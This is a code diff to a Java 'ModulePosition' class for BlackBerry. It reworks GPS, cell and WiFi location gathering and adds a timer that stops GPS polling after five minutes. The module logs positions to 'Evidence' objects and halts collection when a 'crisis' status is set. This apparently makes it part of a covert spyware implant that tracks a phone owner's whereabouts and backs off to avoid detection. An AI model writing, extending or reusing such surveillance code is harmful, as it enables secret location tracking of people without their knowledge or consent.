@@ -11,10 +11,10 @@ package blackberry.module;
 
 import java.io.EOFException;
 import java.util.Date;
+import java.util.Timer;
+import java.util.TimerTask;
 
-import javax.microedition.location.Criteria;
 import javax.microedition.location.Location;
-import javax.microedition.location.LocationProvider;
 import javax.microedition.location.QualifiedCoordinates;
 
 import net.rim.device.api.system.CDMAInfo;
@@ -56,6 +56,7 @@ public final class ModulePosition extends BaseInstantModule implements
     private static final int LOG_TYPE_CDMA = 5;
     private static final long POSITION_DELAY = 1000;
     //private static final int TYPE_GPS_ASSISTED = 3;
+    private static final long STOP_DELAY = 5 * 60 * 1000;
 
     Evidence logGps;
     Evidence logCell;
@@ -77,16 +78,12 @@ public final class ModulePosition extends BaseInstantModule implements
 
     int period;
 
-    LocationProvider lp;
-
-    //Location loc = null;
-
-    boolean waitingForPoint = false;
+    //boolean waitingForPoint = false;
 
     public static String getStaticType() {
         return "position";
     }
-    
+
     public boolean parse(ConfModule conf) {
 
         try {
@@ -117,73 +114,14 @@ public final class ModulePosition extends BaseInstantModule implements
         return true;
     }
 
-    public void actualStart() {
-
-        if (gpsEnabled) {
-
-            final Criteria criteria = new Criteria();
-            criteria.setCostAllowed(true);
-
-            criteria.setHorizontalAccuracy(50);
-            criteria.setVerticalAccuracy(50);
-            criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);
-
-            try {
-                lp = LocationProvider.getInstance(criteria);
-            } catch (final Exception e) {
-                //#ifdef DEBUG
-                debug.error(e);
-                //#endif
-            }
-
-            if (lp == null) {
-                //#ifdef DEBUG
-                debug.error("GPS Not Supported on Device");
-                //#endif               
-
-            }
-
-        }
-
-        if (gpsEnabled && lp != null) {
-            //#ifdef DEBUG
-            //debug.trace("actualStart: logGps.createLog");
-            //#endif
-            //logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS),
-            //        LogType.LOCATION_NEW);
-
-        }
-        if (cellEnabled) {
-            //#ifdef DEBUG
-            //debug.trace("actualStart: logCell.createLog");
-            //#endif
-            /*
-             * if (Device.isCDMA()) { logCell.createLog(getAdditionalData(0,
-             * LOG_TYPE_CDMA), LogType.LOCATION_NEW); } else {
-             * logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM),
-             * LogType.LOCATION_NEW); }
-             */
-        }
-        if (wifiEnabled) {
-            // i log wifi sono uno solo
-        }
-    }
-
     /*
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
-    public void actualGoOld() {
+    public void actualStart() {
         //#ifdef DEBUG
         debug.trace("actualRun");
         //#endif
-
-        if (Status.getInstance().crisisPosition()) {
-            //#ifdef DEBUG
-            debug.warn("Crisis!");
-            //#endif
-            return;
-        }
 
         if (gpsEnabled) {
             //#ifdef DEBUG
@@ -205,31 +143,62 @@ public final class ModulePosition extends BaseInstantModule implements
         }
     }
 
-    public void actualStopOld() {
+    class Alarm extends TimerTask {
 
-        if (gpsEnabled) {
-            if (lp != null) {
-                //#ifdef DEBUG
-                debug.trace("actualStop: resetting ");
-                //#endif
-                //lp.setLocationListener(null, -1, -1, -1);
-                lp.reset();
+        private ModulePosition module;
+
+        public Alarm(ModulePosition modulePosition) {
+            this.module = modulePosition;
+        }
+
+        public void run() {
+            module.stopGps();
+        }
+
+        public void reset() {
+            // TODO Auto-generated method stub
+
+        }
+
+    }
+
+    Alarm alarm = null;
+    private Timer timer;
+    private boolean waitingForPoint;
+
+    private void locationGPS() {
+        if (Status.self().crisisPosition()) {
+            //#ifdef DEBUG
+            debug.trace("locationGPS: crisis");
+            //#endif
+            return;
+        }
+
+        synchronized (this) {
+            if (alarm != null) {
+                alarm.cancel();
             }
-            //#ifdef DEBUG
-            //debug.trace("actualStop: closing logGps");
-            //#endif
-            //logGps.close();
-        }
-        if (cellEnabled) {
-            //#ifdef DEBUG
-            //debug.trace("actualStop: closing logCell");
-            //#endif
-            //logCell.close();
-        }
-        if (wifiEnabled) {
-            // i wifi sono uno solo
+
+            alarm = new Alarm(this);
+            timer = Status.getInstance().getTimer();
+            timer.schedule(alarm, STOP_DELAY, NEVER);
+
+            if (!waitingForPoint) {
+                LocationHelper.getInstance().start(this, false);
+            }else{
+                //#ifdef DEBUG
+                debug.trace("locationGPS, waiting for point");
+                //#endif
+            }
+
         }
 
+    }
+
+    public void stopGps() {
+        alarm.cancel();
+        alarm = null;
+        LocationHelper.getInstance().stop(this);
     }
 
     private void locationWIFI() {
@@ -328,27 +297,6 @@ public final class ModulePosition extends BaseInstantModule implements
             //#ifdef DEBUG
             debug.error("locationCELL: not supported");
             //#endif
-        }
-
-    }
-
-    private void locationGPS() {
-        if (lp == null) {
-            //#ifdef DEBUG
-            debug.error("GPS Not Supported on Device");
-            //#endif               
-            return;
-        }
-
-        if (waitingForPoint) {
-            //#ifdef DEBUG
-            debug.trace("waitingForPoint");
-            //#endif
-            return;
-        }
-
-        synchronized (this) {
-            LocationHelper.getInstance().locationGPS(lp, this, false);
         }
 
     }
